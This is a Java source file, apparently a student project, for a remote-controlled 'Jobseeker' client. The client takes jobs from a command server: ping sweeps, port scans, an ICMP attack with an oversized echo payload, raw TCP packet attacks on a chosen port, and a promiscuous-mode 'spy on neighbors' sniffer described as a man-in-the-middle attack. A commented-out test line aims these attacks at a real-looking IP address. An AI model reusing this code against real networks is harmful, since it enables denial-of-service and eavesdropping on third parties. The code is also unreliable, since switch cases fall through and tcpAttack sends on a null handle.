// A Java program for a Client


import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

import java.io.*;
import java.net.*;
import java.util.List;

import static org.pcap4j.core.PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;


public class Jobseeker{

    public final static String os = System.getProperty("os.name").toLowerCase();        //to detect the OS
    static FileWriter theFile;

    static Socket socket = null;

    public static void main(String[] args) {

        String hostname = "127.0.0.1"; // current IP to be changed later
        int port = 5000; // for peer to peer connection change to port = 61555
        PrintWriter toServer = null;

        try {

            theFile = new FileWriter("jobSeekerOutput.txt");
            theFile.write("**Job Seeker Out Put**\n\n");

            socket = new Socket(hostname, port);
            System.out.println("Connected to Jobcreator.");
            theFile.write("Connected to the Job Creator\n");

            //System.out.println("MacAddress:  "+macAddress(hostname));
            // Creating output stream to Jobcreator

            OutputStream out = socket.getOutputStream();
            toServer = new PrintWriter(out, true);

            // Jobseeker receiving Data from a connected Jobcreator
            InputStream input = socket.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(input));

            while(true) {

                // testing block .. beginning

                //String targetIP = "99.243.74.247";
                //icmpAttack(targetIP);
                // - - - - - - - - - - -
                //tcpAttack(targetIP, 25);

                //testing block .. end

                // JOB ASSIGNMENTS
                System.out.println("Waiting for job assignments...");
                theFile.write("Waiting for job assignments...\n");

                String job = reader.readLine();
                System.out.println("Job received: " + job);
                theFile.write("Job received: " + job + "\n");

                String[] tokens = job.split(","); // Contains data of job


                // Pick job (first token determines job)
                switch (Integer.parseInt(tokens[0])) {
                    // JOB: Detect if a given IP address or Host Name is online or not
                    case 0:
                        SpyOnNeighbors("127.0.0.1");
                    case 1:
                        boolean isOnline;
                        // Detecting by IP
                        if (Integer.parseInt(tokens[1]) == 1)
                            isOnline = InetAddress.getByAddress(convertIP(tokens[2])).isReachable(5000); //Checking if IP address is online

                            // Detecting by Host Name
                        else
                            isOnline = InetAddress.getByName(tokens[2]).isReachable(5000); // Checking if Host Name is online

                        // Output of job
                        if (isOnline)
                            toServer.println(tokens[2] + " is online.");
                        else
                            toServer.println(tokens[2] + " is not online.");
                        break;
                    // JOB: Detect the status of a given port at a given IP address
                    case 2:
                        // Output of job
                        toServer.println(job2(tokens[1], Integer.parseInt(tokens[2])));
                        break;
                    case 3:
                        // Disconnect from Jobcreator and exit
                        toServer.flush();
                        socket.close();
                        reader.close();
                        theFile.close();
                        return;
                    case 4:
                        String targetIp = reader.readLine();
                        icmpAttack(targetIp);
                    case 5:
                        String target = reader.readLine();
                        int portNumber = reader.read();
                        tcpAttack(target, port);
                }
                toServer.flush();
                theFile.close();
            }
        }
        catch(Exception e) {
            if (toServer != null) {
                toServer.println("error"); // Input error
            }
            else{
                System.out.println("File writing may have failed");
                e.printStackTrace();
            }
        }
    }

    public static void icmpAttack(String target) {
        PcapHandle handler;
        PcapNetworkInterface devices;
        PcapStat stat;


        byte[] data = new byte[70000];
        for(int i=0; i< data.length; i++){
            data[i] = (byte) i;
        }

        if(target.contains("/")){

        }
        else{

        }


        try{
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
            NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);


            byte[] mac = niLocal.getHardwareAddress();
            System.out.println("Garbage: "+mac.toString());
            theFile.write("Garbage: "+mac.toString()+"\n");

            MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
            if(sourceMac != null) {
                System.out.println("Source Mac Address is(String): " + sourceMac.toString());
                theFile.write("Source Mac Address is(String): " + sourceMac.toString()+"\n");
            }
            else{
                System.out.println("Source Mac Address is NULL");
                theFile.write("Source Mac Address is NULL\n");
            }

            devices = Pcaps.getDevByAddress(localhost);
            System.out.println(devices);
            System.out.println("Local: "+niLocal.getDisplayName());
            theFile.write(devices+"\n"+"Local: "+niLocal.getDisplayName()+"\n");

            System.out.println("Before Handler");
            theFile.write("Before Handler\n");
            handler = devices.openLive(65570, PROMISCUOUS, 60);
            stat = handler.getStats();
            System.out.println("Before Handler SendPacket");
            System.out.println("\nReceiving Packets\n");
            theFile.write("Before Handler SendPacket\nReceiving Packets\n\n");
            PacketListener packetlistener = new PacketListener() {
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets: ");
                    System.out.println(pcapPacket.getTimestamp());
                    System.out.println(pcapPacket);
                    try {
                        theFile.write("Received packets:  \n" + pcapPacket.getTimestamp() + pcapPacket);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            };

            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
            echoPacket.identifier((short) 1);
            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));

            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
            echoIcmp.type(IcmpV4Type.ECHO);
            echoIcmp.code(IcmpV4Code.NO_CODE);
            echoIcmp.payloadBuilder(echoPacket);
            echoIcmp.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
            ipV4Builder.version(IpVersion.IPV4);
            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
            ipV4Builder.ttl((byte) 100);
            ipV4Builder.protocol(IpNumber.ICMPV4);
            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
            ipV4Builder.payloadBuilder(echoIcmp);
            ipV4Builder.correctChecksumAtBuild(true);
            for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
                System.out.println("****************");
                System.out.println("Sending Echo request Packets");
                System.out.println("****************");
                theFile.write("****************\nSending Echo request Packets\n****************\n");

                //should not be executed om windows
                if(!os.contains("win"))
                    handler.sendPacket(data);
            }

            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
            ethernet.dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS);
            ethernet.srcAddr(sourceMac);
            //
            ethernet.type(EtherType.IPV4);
            ethernet.paddingAtBuild(true);

            Packet packet = ethernet.build();
            System.out.println("****************");
            System.out.println("Sending Echo request Packets");
            System.out.println("****************");
            theFile.write("****************\nSending Echo request Packets\n****************\n");
            handler.sendPacket(packet);
            handler.loop(40, packetlistener);

            System.out.println(stat.getNumPacketsCaptured());
            theFile.write(stat.getNumPacketsCaptured() + "\n");
        }
        catch (Exception p){
            p.printStackTrace();
        }
    }
    // Converts string IP address to byte[]

    public static byte[] convertIP(String IPString) {
        String replaced = IPString.replace('.', ',');
        String[] newIPString = replaced.split(",");

        byte[] ipAddress = new byte[newIPString.length];
        for(int i = 0; i < newIPString.length; i++) {
            ipAddress[i] = (byte) Integer.parseInt(newIPString[i]);
        }

        return ipAddress;
    }
    // Outputs Job2

    public static String job2(String hostName, int portNum) {
        String output = "closed";
        try {
            (new DatagramSocket(portNum, InetAddress.getByName(hostName))).close();
            output = "UDP open";
            (new Socket(hostName, portNum)).close();
            return "TCP and UDP open";
        } catch(IOException ignored) { }

        try {
            (new Socket(hostName, portNum)).close();
            output = "TCP open";
        } catch(IOException ignored) { }

        return output;
    }

    public static String macAddress(byte[] targetIP) throws IOException {
        String mac;

        System.out.println("MacAddress: "+targetIP);
        theFile.write("MacAddress: "+targetIP+"\n");
        mac = new String(targetIP);
        System.out.println("MacAddress: "+mac);
        theFile.write("MacAddress: "+mac+"\n");
        return mac;
    }

    public static void tcpAttack(String target, int port) throws IOException {
        PcapHandle handler = null;
        System.out.println("Connection port: "+socket.getLocalPort());
        theFile.write("Connection port: "+socket.getLocalPort()+"\n");
        int localPort = socket.getLocalPort();
        byte[] data = new byte[900];
        for(int i=0; i < data.length; i++){
            data[i] = (byte) i;
        }

        try {
            // Getting the inet address of both the localhost and targethost
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();

            // Creating a TCP packet
            TcpPacket.Builder tcpPacket = new TcpPacket.Builder();
            tcpPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));
            tcpPacket.srcAddr(localhost);
            tcpPacket.dstAddr(targetAddress);
            tcpPacket.srcPort(TcpPort.getInstance((short)localPort));
            tcpPacket.dstPort(TcpPort.getInstance((short) port));
            tcpPacket.correctLengthAtBuild(true);
            tcpPacket.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4PacketBuilder = new IpV4Packet.Builder();
            ipV4PacketBuilder.payloadBuilder(tcpPacket);
            ipV4PacketBuilder.version(IpVersion.IPV4);
            ipV4PacketBuilder.tos((IpV4Packet.IpV4Tos) () -> (byte) 0);
            ipV4PacketBuilder.protocol(IpNumber.TCP);
            ipV4PacketBuilder.srcAddr((Inet4Address) localhost);
            ipV4PacketBuilder.dstAddr((Inet4Address) targetAddress);
            ipV4PacketBuilder.correctLengthAtBuild(true);
            ipV4PacketBuilder.correctChecksumAtBuild(true);

            IpV4Packet ipV4Packet = ipV4PacketBuilder.build();
            data = ipV4Packet.getRawData();
            System.out.println("New packet: "+IpV4Packet.newPacket(data,0,data.length));
            theFile.write("New packet: "+IpV4Packet.newPacket(data,0,data.length) + "\n");

            handler.sendPacket(data);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    // This will mimic a MIMA(Man-In-Middle-Attack)
    // The machine will give a false impression of being a router
    public static void SpyOnNeighbors(String ip) throws IOException {
        PcapHandle handle = null;
        PcapNetworkInterface networkInterface = null;
        PcapStat packetStat;
        PcapDumper dumper = null;

        System.out.println("----- Spying on My neighbors ----");
        theFile.write("----- Spying on My neighbors ----\n");

        try {
            System.out.println("All the neighbors");
            networkInterface = new NifSelector().selectNetworkInterface();
            handle = networkInterface.openLive(65536, PROMISCUOUS, 50);
            System.out.println("You chose: "+networkInterface);
            theFile.write("All the neighbors\n You chose: "+networkInterface+"\n");
            PcapHandle finalHandle = handle;
            PacketListener listener = pcapPacket -> packetPrint(pcapPacket, finalHandle);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (PcapNativeException e) {
            e.printStackTrace();
        }
    }

    public static void packetPrint(Packet packet, PcapHandle handle){
        StringBuilder packetString = new StringBuilder();
        packetString.append("Packet Captured: ");
        packetString.append(handle.getTimestampPrecision());
        packetString.append(" : ");

        System.out.println(packetString);
        System.out.println("- - - - - Packet  - - - - -- -");
        System.out.println(packet);
    }

}
